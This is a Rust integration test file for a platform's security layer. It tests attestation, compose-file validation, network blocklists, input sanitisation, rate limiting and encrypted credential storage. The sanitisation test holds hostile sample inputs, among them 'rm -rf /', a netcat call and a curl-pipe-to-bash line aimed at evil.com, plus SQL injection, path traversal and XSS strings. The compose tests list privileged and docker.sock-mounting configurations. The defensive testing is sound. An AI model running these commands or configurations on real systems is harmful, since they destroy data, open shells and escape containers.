// Integration tests for security and error handling
use platform_engine_attest_client::{AttestationClient, AttestationConfig};
use platform_engine_executor::{SecurityManager, VMExecutor};
use platform_engine_api_client::PlatformApiClient;
use platform_api_models::*;
use std::sync::Arc;
use uuid::Uuid;

#[tokio::test]
async fn test_attestation_verification() {
    // Setup attestation client
    let config = AttestationConfig {
        platform_api_url: "http://localhost:8000".to_string(),
        enable_tdx: std::env::var("TEE_AVAILABLE").unwrap_or_default() == "true",
        dev_mode: std::env::var("DEV_MODE").unwrap_or_else(|_| "true".to_string()) == "true",
        session_timeout: 3600,
    };
    
    let attest_client = AttestationClient::new(config)
        .expect("Failed to create attestation client");
    
    // Generate nonce for attestation
    let nonce = attest_client.generate_nonce();
    assert_eq!(nonce.len(), 32);
    
    // Create attestation request
    let measurements = if attest_client.config.enable_tdx {
        // Real TDX measurements
        vec![
            Measurement {
                name: "kernel".to_string(),
                value: attest_client.get_kernel_measurement().await.unwrap(),
                algorithm: "sha256".to_string(),
            },
            Measurement {
                name: "initrd".to_string(),
                value: attest_client.get_initrd_measurement().await.unwrap(),
                algorithm: "sha256".to_string(),
            },
        ]
    } else {
        // Dev mode measurements
        vec![
            Measurement {
                name: "kernel".to_string(),
                value: "dev_kernel_hash".to_string(),
                algorithm: "sha256".to_string(),
            },
        ]
    };
    
    // Request attestation
    let result = attest_client.request_attestation(nonce, measurements)
        .await
        .expect("Failed to request attestation");
    
    assert_eq!(result.status, AttestationStatus::Verified);
    assert!(!result.session_token.is_empty());
    
    // Store session for subsequent API calls
    attest_client.set_session_token(result.session_token.clone()).await;
    
    // Verify session is valid
    let is_valid = attest_client.verify_session().await
        .expect("Failed to verify session");
    
    assert!(is_valid);
}

#[tokio::test]
async fn test_malicious_code_detection() {
    let security_manager = SecurityManager::new();
    
    // Test various malicious patterns
    let malicious_compose_yamls = vec![
        // Privileged container
        r#"
version: '3.8'
services:
  evil:
    image: malicious:latest
    privileged: true
"#,
        // Host network mode
        r#"
version: '3.8'
services:
  evil:
    image: malicious:latest
    network_mode: host
"#,
        // Volume mounting sensitive paths
        r#"
version: '3.8'
services:
  evil:
    image: malicious:latest
    volumes:
      - /etc:/host-etc
      - /var/run/docker.sock:/var/run/docker.sock
"#,
        // Capabilities that could be dangerous
        r#"
version: '3.8'
services:
  evil:
    image: malicious:latest
    cap_add:
      - SYS_ADMIN
      - NET_ADMIN
"#,
    ];
    
    for (i, yaml) in malicious_compose_yamls.iter().enumerate() {
        let validation_result = security_manager.validate_compose_yaml(yaml).await;
        assert!(
            validation_result.is_err(),
            "Malicious compose {} should have been rejected",
            i
        );
    }
    
    // Test safe compose
    let safe_compose = r#"
version: '3.8'
services:
  challenge:
    image: alpine:latest
    command: ["echo", "hello"]
    environment:
      - SAFE_VAR=value
"#;
    
    let validation_result = security_manager.validate_compose_yaml(safe_compose).await;
    assert!(validation_result.is_ok(), "Safe compose should be accepted");
}

#[tokio::test]
async fn test_resource_exhaustion_prevention() {
    let executor = VMExecutor::new(Default::default())
        .await
        .expect("Failed to create executor");
    
    // Try to provision VM with excessive resources
    let excessive_spec = platform_engine_challenge_spec::ChallengeSpec {
        id: Uuid::new_v4(),
        name: "resource-hog".to_string(),
        compose_hash: "excessive_resources".to_string(),
        compose_yaml: "version: '3.8'\nservices:\n  hog:\n    image: alpine".to_string(),
        resources: platform_engine_challenge_spec::ResourceRequirements {
            cpu_cores: 1000,      // Way too many
            memory_mb: 1024000,   // 1TB - excessive
            disk_gb: 10000,       // 10TB - excessive
            gpu_required: true,
            gpu_model: Some("A100".to_string()),
            network_bandwidth_mbps: Some(100000), // 100Gbps - excessive
        },
        timeout_seconds: 86400,   // 24 hours - too long
        max_retries: 100,         // Too many retries
    };
    
    let result = executor.provision_cvm(&excessive_spec).await;
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("resources exceed limits"));
}

#[tokio::test]
async fn test_network_security_policies() {
    let security_manager = SecurityManager::new();
    
    // Test network access policies
    let test_endpoints = vec![
        // Allowed endpoints
        ("api.openai.com", true),
        ("api.anthropic.com", true),
        ("pypi.org", true),
        ("github.com", true),
        
        // Blocked endpoints
        ("malicious-crypto-miner.com", false),
        ("command-and-control.evil.com", false),
        ("192.168.1.1", false),  // Private IP
        ("169.254.169.254", false), // AWS metadata endpoint
        ("localhost", false),
        ("127.0.0.1", false),
    ];
    
    for (endpoint, should_allow) in test_endpoints {
        let result = security_manager.check_network_access(endpoint).await;
        assert_eq!(
            result.allowed,
            should_allow,
            "Endpoint {} should be {}",
            endpoint,
            if should_allow { "allowed" } else { "blocked" }
        );
    }
}

#[tokio::test]
async fn test_error_recovery_mechanisms() {
    let api_client = create_test_api_client();
    
    // Test API retry logic
    let mut retry_count = 0;
    let result = api_client.with_retry(|| async {
        retry_count += 1;
        if retry_count < 3 {
            Err(anyhow::anyhow!("Transient error"))
        } else {
            Ok("Success after retries")
        }
    }).await;
    
    assert!(result.is_ok());
    assert_eq!(retry_count, 3);
    
    // Test circuit breaker
    let circuit_breaker = api_client.get_circuit_breaker();
    
    // Simulate failures to trip circuit
    for _ in 0..10 {
        let _ = circuit_breaker.call(|| async {
            Err::<(), _>(anyhow::anyhow!("Service unavailable"))
        }).await;
    }
    
    // Circuit should be open
    assert!(circuit_breaker.is_open());
    
    // Calls should fail fast
    let result = circuit_breaker.call(|| async {
        Ok("This should not execute")
    }).await;
    
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("Circuit breaker open"));
}

#[tokio::test]
async fn test_input_validation_and_sanitization() {
    let security_manager = SecurityManager::new();
    
    // Test various injection attempts
    let injection_tests = vec![
        // SQL injection attempts
        ("'; DROP TABLE users; --", "sql_injection"),
        ("1' OR '1'='1", "sql_injection"),
        
        // Command injection attempts
        ("; rm -rf /", "command_injection"),
        ("| nc evil.com 1337", "command_injection"),
        ("$(curl evil.com/shell.sh | bash)", "command_injection"),
        
        // Path traversal attempts
        ("../../../etc/passwd", "path_traversal"),
        ("..\\..\\..\\windows\\system32", "path_traversal"),
        
        // XSS attempts  
        ("<script>alert('xss')</script>", "xss"),
        ("javascript:eval('malicious')", "xss"),
    ];
    
    for (input, attack_type) in injection_tests {
        let sanitized = security_manager.sanitize_input(input).await;
        assert_ne!(
            sanitized, input,
            "{} attempt should be sanitized",
            attack_type
        );
        
        // Verify sanitized version is safe
        let is_safe = security_manager.validate_safe_input(&sanitized).await;
        assert!(is_safe, "Sanitized input should be safe");
    }
}

#[tokio::test]
async fn test_secure_communication_channels() {
    use platform_engine_executor::SecureChannel;
    
    // Create secure channel between validator and platform API
    let channel = SecureChannel::new()
        .await
        .expect("Failed to create secure channel");
    
    // Test encryption
    let test_data = b"sensitive job data";
    let encrypted = channel.encrypt(test_data)
        .expect("Failed to encrypt data");
    
    assert_ne!(&encrypted[..], test_data);
    assert!(encrypted.len() > test_data.len()); // Should include nonce/tag
    
    // Test decryption
    let decrypted = channel.decrypt(&encrypted)
        .expect("Failed to decrypt data");
    
    assert_eq!(&decrypted[..], test_data);
    
    // Test tampering detection
    let mut tampered = encrypted.clone();
    tampered[10] ^= 0xFF; // Flip some bits
    
    let result = channel.decrypt(&tampered);
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("authentication"));
}

#[tokio::test]
async fn test_permission_enforcement() {
    let api_client = create_test_api_client();
    
    // Test unauthorized access attempts
    let unauthorized_tests = vec![
        // Try to access admin endpoints without admin role
        ("POST", "/admin/shutdown"),
        ("DELETE", "/challenges/all"),
        ("PUT", "/validators/*/force-update"),
        
        // Try to access other validator's data
        ("GET", "/validators/other-validator/jobs"),
        ("POST", "/validators/other-validator/claim"),
    ];
    
    for (method, path) in unauthorized_tests {
        let result = api_client.raw_request(method, path, None::<()>).await;
        assert!(
            result.is_err() || {
                if let Ok(response) = result {
                    response.status() == 403 || response.status() == 401
                } else {
                    false
                }
            },
            "Unauthorized request {} {} should be rejected",
            method,
            path
        );
    }
}

#[tokio::test] 
async fn test_dos_protection() {
    let api_client = create_test_api_client();
    
    // Attempt rapid requests to trigger rate limiting
    let mut success_count = 0;
    let mut rate_limited_count = 0;
    
    for i in 0..100 {
        let result = api_client.get_job_stats(None).await;
        
        match result {
            Ok(_) => success_count += 1,
            Err(e) => {
                if e.to_string().contains("rate limit") || e.to_string().contains("429") {
                    rate_limited_count += 1;
                }
            }
        }
        
        // Don't sleep - we want to hit rate limits
    }
    
    // Should have been rate limited at some point
    assert!(
        rate_limited_count > 0,
        "Rate limiting should have triggered after {} requests",
        success_count
    );
}

#[tokio::test]
async fn test_secure_credential_handling() {
    use platform_engine_executor::CredentialManager;
    
    let cred_manager = CredentialManager::new()
        .expect("Failed to create credential manager");
    
    // Test credential storage
    let test_creds = vec![
        ("api_key", "sk-test-12345"),
        ("database_url", "postgres://user:pass@host/db"),
        ("encryption_key", "aes-256-key-32-bytes-long!!!!!!!"),
    ];
    
    for (name, value) in &test_creds {
        cred_manager.store_credential(name, value)
            .await
            .expect("Failed to store credential");
    }
    
    // Verify credentials are encrypted at rest
    let raw_storage = cred_manager.get_raw_storage().await;
    for (name, value) in &test_creds {
        assert!(
            !raw_storage.contains(value),
            "Credential {} should be encrypted",
            name
        );
    }
    
    // Test credential retrieval
    for (name, expected_value) in &test_creds {
        let retrieved = cred_manager.get_credential(name)
            .await
            .expect("Failed to retrieve credential");
        
        assert_eq!(&retrieved, expected_value);
    }
    
    // Test credential rotation
    cred_manager.rotate_credential("api_key", "sk-new-67890")
        .await
        .expect("Failed to rotate credential");
    
    let new_value = cred_manager.get_credential("api_key")
        .await
        .expect("Failed to get rotated credential");
    
    assert_eq!(new_value, "sk-new-67890");
}

// Helper functions

fn create_test_api_client() -> Arc<PlatformApiClient> {
    let config = platform_engine_api_client::ApiConfig {
        base_url: "http://localhost:8000".to_string(),
        api_key: Some("test-api-key".to_string()),
        timeout_seconds: 30,
        max_retries: 3,
    };
    
    Arc::new(
        PlatformApiClient::new(config)
            .expect("Failed to create API client")
    )
}
